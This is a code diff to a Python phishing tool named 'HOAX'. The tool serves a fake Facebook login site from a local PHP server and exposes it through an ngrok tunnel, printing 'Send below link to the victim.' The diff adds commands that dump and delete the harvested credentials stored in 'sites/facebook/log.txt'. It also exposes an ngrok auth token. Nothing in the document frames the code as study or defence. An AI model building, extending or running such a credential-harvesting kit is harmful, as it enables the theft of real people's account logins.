@@ -5,6 +5,7 @@ import time
 from pyngrok import ngrok, conf
 import pyfiglet
 import os
+import credentials
 
 # auth_key = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
 ascii_banner = pyfiglet.figlet_format("HOAX!")
@@ -14,14 +15,19 @@ print(" "*10 + "Coded with <3, cj.")
 print(" "+"*"*16 + " HOAX " + "*"*16)
 
 #help, manual for commands
+
 def help(Command):
     match Command:
         case "help":
             print(" [-h, help] for information about how commads work.\n [-v, version] show  the current version of tool.\n [-a, auth] author of the tool. \n [-n, name] tool name.")
             print(" [0] terminates the script")
+            print(" [-dc, dump-cred] shows the all credentials")
+            print(" [-rc, del-cred] delete tha all credentials")
         case "-h":
             print(" [-h, help] for information about how commads work.\n [-v, version] show  the current version of tool.\n [-a, auth] author of the tool. \n [-n, name] tool name.")
             print(" [0] terminates the script")
+            print(" [-dc, dump-cred] shows the all credentials")
+            print(" [-rc, del-cred] delete tha all credentials")
         case "version":
             f = open('package.json')
             data = json.load(f)
@@ -52,6 +58,14 @@ def help(Command):
             data = json.load(f)
             print(" Name: " + data['name'])
             f.close()
+        case "-rc":
+            credentials.del_credential("sites/facebook/log.txt")
+        case "-dc":
+            credentials.find_credentials("sites/facebook/log.txt")
+        case "rm-cred":
+            credentials.del_credential("sites/facebook/log.txt")
+        case "dump-cred":
+            credentials.find_credentials("sites/facebook/log.txt")
         case defualt:
             print(" ERR: Command not found, \""+Command+"\""+" is not valid cammand!")
 
@@ -108,7 +122,6 @@ def options(USER_INPUT):
 def server_run(str_path, prt):
     PORT = prt
     comd = "php -S localhost:" + str(prt) + " -t " + str_path
-    
     print(" [+] server running on port: " + str(PORT))
     time.sleep(3)
     print(" [+] Link:> http://1270.0.0.1:" + str(PORT))
@@ -117,7 +130,7 @@ def server_run(str_path, prt):
     time.sleep(3)
     # Star the server
     print(" [+] Send below link to the victim. ")
-    conf.get_default().auth_token = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
+    # conf.get_default().auth_token = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
     url = ngrok.connect(PORT, "http")
     print(" [+] "+ str(url))
     time.sleep(3)
